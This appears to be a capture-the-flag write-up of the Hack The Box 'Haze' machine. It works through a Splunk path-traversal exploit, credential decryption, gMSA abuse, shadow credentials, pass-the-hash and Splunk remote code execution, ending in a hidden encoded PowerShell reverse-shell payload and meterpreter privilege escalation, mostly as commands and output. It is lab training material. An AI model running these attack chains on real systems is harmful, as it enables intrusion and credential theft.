# User flag
## 1. rustscan
```python
Host is up, received echo-reply ttl 127 (0.25s latency).
Scanned at 2025-03-31 08:34:33 EDT for 93s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-31 20:34:40Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: 
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
8000/tcp  open  http          syn-ack ttl 127 Splunkd httpd
|_http-server-header: Splunkd
| http-methods: 
|_  Supported Methods: POST OPTIONS
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.88.181:8000/en-US/account/login?return_to=%2Fen-US%2F
8088/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
| http-methods: 
|_  Supported Methods: GET POST HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: 404 Not Found
8089/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
| http-methods: 
|_  Supported Methods: OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
|_http-title: splunkd

9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53596/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53601/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53603/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53619/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53651/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44681/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 61531/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29334/udp): CLEAN (Failed to receive data)
|   Check 4 (port 8713/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-31T20:35:42
|_  start_date: N/A
|_clock-skew: 7h59m57s
```

## 2. Splunk on port 8000
=> https://github.com/bigb0x/CVE-2024-36991/tree/main
```
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152 :edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152 :mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152 :paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152 
```
try to decrypt the password:
```python
$ wget http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret

$ splunksecrets splunk-decrypt --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=' -S splunk.secret  
Ld@p_Auth_Sp1unk@2k24
```
## 3. bloodhound
```python
$ nxc ldap 10.129.88.181 -u 'Paul.Taylor' -p 'Ld@p_Auth_Sp1unk@2k24'  --bloodhound --collection all --dns-server 10.129.88.181 
/usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence '\-'
  xml_sid_rex = re.compile('<UserId>(S-[0-9\-]+)</UserId>')
SMB         10.129.88.181   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAP        10.129.88.181   389    DC01             [+] haze.htb\Paul.Taylor:Ld@p_Auth_Sp1unk@2k24 
```

=> high value user
```
SMB         10.129.88.181   445    DC01             1104: HAZE\mark.adams (SidTypeUser) <- can login by password spray
SMB         10.129.88.181   445    DC01             1105: HAZE\edward.martin (SidTypeUser)
```

## 4. attack GMSA
=> https://medium.com/@offsecdeer/attacking-group-managed-service-accounts-gmsa-5e9c54c56e49

>`msDS-GroupMSAMembership` contains a security descriptor in string form, this syntax is called `String(NT-Sec-Desc)` and is a base64 encoded binary security descriptor. While the attribute can’t be interpreted directly, AD exposes a property called `PrincipalsAllowedToRetrieveManagedPassword` which interprets and updates `msDS-GroupMSAMembership` for us

```python
┌──(kali㉿kali)-[~]
└─$ dacledit.py -target HAZE-IT-BACKUP$ -dc-ip 10.129.232.42 haze.htb/mark.adams:'Ld@p_Auth_Sp1unk@2k24'

[*]   ACE[5] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : ms-DS-GroupMSAMembership (888eedd6-ce04-df40-b462-b8a50e41ba38)
[*]     Trustee (SID)             : gMSA_Managers (S-1-5-21-323145914-28650650-2368316563-1107)

*Evil-WinRM* PS C:\Users\mark.adams\Documents> Set-ADServiceAccount -Identity "Haze-IT-Backup" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"

$ python3 gMSADumper.py -d haze.htb -l 10.129.88.181 -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24'
Users or groups who can read password for Haze-IT-Backup$:
 > mark.adams
Haze-IT-Backup$:::735c02c6b2dc54c3c8c6891f55279ebc
Haze-IT-Backup$:aes256-cts-hmac-sha1-96:38c90a95f7e038a6cb57d3e21c405c2875e88f1edbb1e082f1dd75d01eda60fd
Haze-IT-Backup$:aes128-cts-hmac-sha1-96:0926f5e64d85018a506ecadff3df4f95
```

![[Pasted image 20250401021054.png]]
## 5. shadow credential

![[Pasted image 20250401201717.png]]
```bash
#!/bin/bash

hostIP="10.129.148.237"
domain="haze.htb"
username="Haze-IT-Backup$"
backupHash=":735c02c6b2dc54c3c8c6891f55279ebc"
groupServer="SUPPORT_SERVICES"
pywhisker="python3 /home/kali/Tools/windows/pywhisker/pywhisker/pywhisker.py"


sudo rdate -n $hostIP

bloodyAD --host $hostIP -d $domain -u $username -p $backupHash set owner $groupServer $username
bloodyAD --host $hostIP -d $domain -u $username -p $backupHash add genericAll $groupServer $username
bloodyAD --host $hostIP -d $domain -u $username -p $backupHash add groupMember $groupServer $username

getTGT.py -dc-ip $hostIP '$domain'/'$username' -hashes '00$backupHash'

$pywhisker -d $domain -u $username -H "$backupHash" --target "edward.martin" --action add
$ python3 gettgtpkinit.py -cert-pfx ../SL08osOx.pfx  -pfx-pass tnHiSEDZOIa2HR7VNLs5 'haze.htb'/'EDWARD.MARTIN' edward.ccache
2025-04-01 16:47:36,881 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

$ KRB5CCNAME=edward.ccache python3 getnthash.py -key 6bdc1cb9cd53ca4866e027eb6bd25afaaf95c1a022821f95a5776c32b2cec3b4 'haze.htb'/'EDWARD.MARTIN'

09e0b3eeb2e7a6b0d419e9ff8f4d91af
```
**IF YOU TRY TO CHANGE PASSWORD**
![[Pasted image 20250404104221.png]]
## 6. Evil-winrm
```python
┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ evil-winrm -u 'edward.martin' -H '09e0b3eeb2e7a6b0d419e9ff8f4d91af' -i 'haze.htb'
*Evil-WinRM* PS C:\Users\edward.martin\Desktop> ls


    Directory: C:\Users\edward.martin\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          4/1/2025   1:32 PM             34 user.txt
```
# root flag
## 1. Use priv to check backup
```python
*Evil-WinRM* PS C:\> icacls Backups
Backups HAZE\Backup_Reviewers:(OI)(CI)(RX)
        CREATOR OWNER:(OI)(CI)(IO)(F)
        NT AUTHORITY\SYSTEM:(OI)(CI)(F)
        BUILTIN\Administrators:(OI)(CI)(F)
    
=> In var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf

┌──(.splunksecrets)─(kali㉿kali)-[~/Desktop/htb/splunksecrets]
└─$ splunksecrets splunk-legacy-decrypt --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI=' -S splunk.secret 

Sp1unkadmin@2k24
```

## 2. On port 8089
```python
=> https://haze.htb:8089/services/admin

I've met this service in machine "Doctor"
=> $ python3 PySplunkWhisperer2_remote.py --host 10.129.148.237 --lhost 10.10.14.41 --username admin --password Sp1unkadmin@2k24 --payload "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0A"

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > shell
Process 1128 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.3328]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
type root.txt
```